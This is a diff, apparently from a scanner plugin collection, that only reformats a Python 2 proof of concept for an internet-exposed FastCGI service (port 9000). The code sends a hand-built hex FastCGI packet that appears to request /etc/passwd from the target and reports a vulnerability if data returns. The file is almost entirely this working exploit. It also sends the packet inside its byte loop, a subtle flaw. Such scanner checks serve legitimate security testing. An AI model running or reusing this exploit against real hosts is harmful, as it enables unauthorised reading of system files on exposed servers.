@@ -5,11 +5,12 @@ from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 import socket
 import urlparse
 
+
 class Vuln(ABVuln):
-    vuln_id = 'fcgi_0001' # 平台漏洞编号，留空
+    vuln_id = 'fcgi_0001'  # 平台漏洞编号，留空
     name = 'fcgi 暴露于公网'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.OTHER # 漏洞类型
+    type = VulnType.OTHER  # 漏洞类型
     disclosure_date = 'Unknown'  # 漏洞公布时间
     desc = '''
         由于fcgi和webserver对script路径级参数的理解不同出现的问题。
@@ -21,6 +22,7 @@ class Vuln(ABVuln):
     cve_id = 'Unknown'  # cve编号
     product = 'fcgi'  # 漏洞应用名称
     product_version = 'Unknown'  # 漏洞应用版本
+
 
 class Poc(ABPoc):
     poc_id = 'c423d49c-8d56-4ffe-83ab-d5c38db600e5'
@@ -34,13 +36,14 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
-            #获取主机IP地址
+
+            # 获取主机IP地址
             o = urlparse.urlparse(self.target)
             target_ip = socket.gethostbyname(o.hostname)
-            #print(target_ip)
+            # print(target_ip)
             try:
-                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM); sock.settimeout(3.0)
+                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                sock.settimeout(3.0)
                 sock.connect((target_ip, 9000))
                 data = """
                         01 01 00 01 00 08 00 00  00 01 00 00 00 00 00 00
@@ -54,10 +57,10 @@ class Poc(ABPoc):
                         70 61 73 73 77 64 0f 10  53 45 52 56 45 52 5f 53
                         4f 46 54 57 41 52 45 67  6f 20 2f 20 66 63 67 69
                         63 6c 69 65 6e 74 20 00  01 04 00 01 00 00 00 00
-                """  
+                """
                 data_s = ''
                 for _ in data.split():
-                    data_s += chr(int(_,16))
+                    data_s += chr(int(_, 16))
                     sock.send(data_s)
                 try:
                     ret = sock.recv(1024)
@@ -66,7 +69,7 @@ class Poc(ABPoc):
                         self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                             target=self.target, name=self.vuln.name))
                 except Exception, e:
-                    pass     
+                    pass
                 sock.close()
             except Exception, e:
                 pass
@@ -76,6 +79,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
